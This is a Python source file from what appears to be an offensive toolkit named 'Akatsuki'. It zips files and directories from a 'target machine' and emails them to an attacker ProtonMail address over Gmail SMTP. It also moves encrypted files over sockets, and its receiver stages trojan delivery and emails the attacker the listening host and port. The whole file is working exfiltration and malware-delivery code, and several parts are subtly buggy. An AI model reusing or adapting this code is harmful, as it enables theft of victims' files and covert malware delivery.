#I want to create a script that would allow me download a file through the email and any other means discovered

#Useful libraries that I would be working with
try:
    import os
    import sys
    from zipfile import ZipFile
    import shutil
    from email.message import EmailMessage
    import smtplib
    import imghdr
    import socket
    import base64
    import json
    import pickle
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.backends import default_backend
    from cryptography.hazmat.primitives import hashes
    from cryptography.fernet import Fernet
    from akatsuki_library import code_timestamp as cts
    from akatsuki_library import config
    from akatsuki_library import ip_info
    from akatsuki_library import ip_tracker
    from akatsuki_library import shinigami_crypter as sgc
    #from PyTerminalColor.TerminalColor import TerminalColor
    import tqdm
    import traceback
    from threading import Thread
except:
    print(f"An error occurred in imported libraries due to [{e}]")

#attackers = list(config.attackers_dict.keys())
#print(attackers)
#exit()

#Declaring the functions
def email_(file, subject = None, content = None, receiver = None):
    if content:
        content = f"\n\n{content}"
    else:
        content = ""
    try:
        sender = config.senderAddress
        recipient = [config.akatsukiProtonAddress] #You can add more emails to this list depending how many people you want to send an email
        if receiver:
            recipient.append(receiver)
        else:
            pass

        password = config.senderPassword
        message = EmailMessage()
        message["Subject"] = f"{subject}"
        message["From"] = "Akatsuki Soshiki"
        message["To"] = recipient
        if file:
            message.set_content(f"{file} successfully sent from target machine {content}")
        else:
            message.set_content(f"Successfully sent from target machine {content}")

        #This sends the attachment to the specified email
        if file:
            with open(file, "rb") as f:
                fileData = f.read()
                if ".jpg" or ".png" in file:
                    fileMainType = "image"
                    fileSubType = imghdr.what(f.name)
                else:
                    fileMainType = "application"
                    fileSubType = "octet-stream"
                fileName = f.name

            message.add_attachment(fileData, 
                                    maintype = str(fileMainType),
                                    subtype = str(fileSubType),
                                    filename = fileName) #This sends the specified attachment

        #This handles the sending of the email
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(sender, password)
            smtp.send_message(message)
        stat = f"{file} successfully zipped, sent to the email and deleted on target machine"
    except Exception as e:
        stat = f"{file} wasn't sent due to [{e}]"
    print(stat)
    return stat


#This property allows us to downloads file from the target machine
def emailer(file, subject = None, content = None, receiver = None):
    try:
        #This session checks if its a file or directory, then zips it and sends it to the specified emails
        if os.path.isdir(file) == True:
            shutil.make_archive(f"{file}", 'zip', f"{file}")

            d = email_(f"{file}.zip", subject, content, receiver) #This part the zip file will be sent to akatsuki protonmail
                
            os.remove(f"{file}.zip")

            return d
        #This session checks if its a file or directory, then zips it and sends it to the specified emails
        elif os.path.isfile(file) == True:
            for id, i in enumerate(file):
                if i == ".":
                    filename = file[:id]
            with ZipFile(f'{filename}.zip', 'w') as zipf:
                zipf.write(f"{file}")

            d = email_(f"{filename}.zip", subject, content, receiver) #This part the zip file will be sent to akatsuki protonmail
                
            os.remove(f"{filename}.zip")
            
            return d
        else:
            return f"Couldn't find {file}, cross check the spelling and use the correct syntax --> attack.download filename"

    except Exception as e:
        return f"An error occurred when trying to email the file due to [{e}]"


#This function handles the efficient sending of report to the specified email
def send_report(target, filename, report, subject = None, content = None, receiver = None):
    #This section would write and send the report to the specified email
    file_name = f"{target}_{filename}.txt"
    with open(file_name, "w") as dt:
        dt.write(report)
    print(f"File name: {file_name}")
    send = emailer(file_name, f"{subject} report", content, receiver)
    stat = f"{subject} report has been written and sent successfully"
    print(f"{'~' * 30} \n{stat} \n{'~' * 30}")
    os.remove(file_name)
    return stat


#Remember to encrypt/decrypt the files that would be sent/recived respectfully
#Declaring the various classes that would handle the sending and receiving of file via socket
class Transfer:
    def __init__(self, attacker = None, target = None, mode = None, xtraRecipient = None):
        self.crypter = sgc.Crypter()
        self.s = socket.socket()
        self.user, self.host, self.publicIP, self.privateIP = ip_info.main()
        self.bufferSize = 4096
        self.separator = "<separator>"
        self.port = config.file_transfer
        self.attacker = attacker
        self.target = target
        self.mode = mode
        self.xtraRecipient = xtraRecipient

    #This handles the sender side
    def sender(self, host, filename, port_ = None):
        try:
            filePath = f"{os.getcwd()}\\{filename}"
            if os.path.exists(filePath):
                filePath = filePath
            elif os.path.exists(filename):
                filePath = filename
            else:
                raise FileNotFoundError("Declare file path correctly")
            
            filesize = os.path.getsize(filePath)

            #Checking for mode type to fine tune the operation
            if self.mode:
                if self.mode == "attacker":
                    stats, state = ip_tracker.locate(self.publicIP)
                    if state in config.country:
                        raise ConnectionAbortedError("IP address associated with flagged countries")
                    else:
                        pass
                elif self.mode == "target":
                    pass
                else:
                    raise ValueError("Invalid mode type")
            else:
                pass

            #Connecting to the server
            if port_:
                _port_ = port_
            else:
                _port_ = self.port

            print(f"Connecting to {host}: {_port_}")
            self.s.connect((host, _port_))
            print("Connected")

            file_, fernetKey, stat = self.crypter.encrypter(filePath) #Encrypting the file before sending it
            print(f"Sender FernetKey: {fernetKey}")
            #Sending the file name and file path
            #fernetKey = "testing"
            packet = pickle.dumps([filePath, filesize, fernetKey])
            #self.s.send(f"{filePath}{self.separator}{filesize}{self.separator}{fernetKey}".encode())
            self.s.send(packet)
            print(f"File Data: {filePath}{self.separator}{filesize}")
            progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
            with open(filePath, "rb") as f:
                while True:
                    # read the bytes from the file
                    bytes_read = f.read(self.bufferSize)
                    if not bytes_read:
                        # file transmitting is done
                        break
                    # we use sendall to assure transimission in 
                    # busy networks
                    self.s.sendall(bytes_read)
                    # update the progress bar
                    progress.update(len(bytes_read))
            # close the socket
            self.s.close() 
            _file_, stat_ = self.crypter.decrypter(filePath, fernetKey) #Decrypting the file after sending it
            stat = email_(file = None, subject = f"Sent {filename} Transfer", content = f"Attacker: {self.attacker} \nTarget: {self.target}", receiver = self.xtraRecipient)
        except Exception as e:
            stat_ = f"An error when trying to set up connection with sender due to [{e}]"
            print(stat_)
            traceback.print_exc()
            raise KeyboardInterrupt
        return stat_

    #This handles the receiver side
    def receiver(self, trojan = False, port_ = None):
        try:
            #Checking for the mode type and choosing the best ip for the operation
            if self.mode:
                if self.mode == "attacker":
                    stats, state = ip_tracker.locate(self.publicIP)
                    if state in config.country:
                        raise ConnectionAbortedError("IP address associated with flagged countries")
                    else:
                        host = self.publicIP
                elif self.mode == "target":
                    host = self.publicIP
                else:
                    raise ValueError("Invalid mode type")
            else:
                host = self.privateIP

            #Checking for the port
            if port_:
                _port_ = port_
            else:
                _port_ = self.port

            print(f"Host: {host}.. Port: {_port_}")
            self.s.bind((host, _port_))
            self.s.listen(5)
            print(f"Listening on {host}: {_port_}")

            #Checking if the download file is being used to deliver a trojan before alerting the attacker
            if trojan:
                args_ = {"file":None, "subject":f"Attacker: {self.attacker} \nTarget: {self.target} \nHost: {host} \nPort: {_port_}", "content":"Malware Receiver Setup successfully", "receiver":self.xtraRecipient}
                t1 = Thread(target = email_, kwargs = args_)
                t1.start()

            client_socket, addr = self.s.accept()
            print(f"{addr} is connected successfully!")

            #Receiving the filename and filesize
            #recv = client_socket.recv(self.bufferSize).decode()
            recv = client_socket.recv(self.bufferSize)
            packet = pickle.loads(recv)
            #filename, fileSize, fernetKey = recv.split(self.separator)
            filename, fileSize, fernetKey = packet[0], packet[1], packet[2]
            #print(recv.split(self.separator))
            print(f"Receiver FernetKey: {fernetKey}, Type: {type(fernetKey)}")
            print(f"Receiver Filename: {filename}")
            print(f"Receiver File size: {fileSize}")
            filename = os.path.basename(filename)
            fileSize = int(fileSize)

            #Now its time to receive the file
            progress = tqdm.tqdm(range(fileSize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
            with open(filename, "wb") as f:
                while True:
                    # read 1024 bytes from the socket (receive)
                    bytes_read = client_socket.recv(self.bufferSize)
                    if not bytes_read:    
                        # nothing is received
                        # file transmitting is done
                        break
                    # write to the file the bytes we just received
                    f.write(bytes_read)
                    # update the progress bar
                    progress.update(len(bytes_read))
            # close the client socket
            client_socket.close()
            # close the server socket
            self.s.close()
            filePath = os.path.basename(filename)

            _file_, stat_ = self.crypter.decrypter(filename, fernetKey) #Decrypting the file
            stat = email_(file = None, subject = f"Received {filename} Transfer", content = f"Attacker: {self.attacker} \nTarget: {self.target}", receiver = self.xtraRecipient)
        except Exception as e:
            stat_ = f"An error occured when setting up connection with receiver due to [{e}]"
            print(stat_)
            traceback.print_exc()
            raise KeyboardInterrupt
        return filename, stat_
                
    #This function handles the receiving of malware
    def malware_receiver(self):
        t1 = Thread(target = self.receiver)
        t1.start()
        

        for t in [t1, t2]:
            t.join()



if __name__ == "__main__":
    #Setting the code time stampo
    cts.codeTimestamp("File Downloader", "Python", 2022, 3, 24, 20, 31, 2).display()

    print("FILE DOWNLOADER \n")

    #send = emailer("switch.py")
    #print(send)
    #a = Transfer().sender("192.168.144.1", "switcher.py")
    a = Transfer().receiver()

    print("\nExecuted sucessfully!!")

